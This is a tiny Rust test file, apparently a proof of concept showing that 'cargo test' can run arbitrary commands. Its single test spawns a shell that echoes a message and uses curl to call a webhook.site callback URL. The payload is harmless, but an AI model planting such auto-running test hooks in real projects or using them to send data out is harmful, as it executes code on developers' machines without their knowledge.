#[test]
fn test_rce() {
    // This would execute if cargo test is run, but NOT with cargo fmt
    let _ = std::process::Command::new("sh")
        .arg("-c")
        .arg("echo 'RCE via test!' && curl -s 'https://webhook.site/test?msg=test+executed'")
        .output()
        .expect("failed to execute process");
}
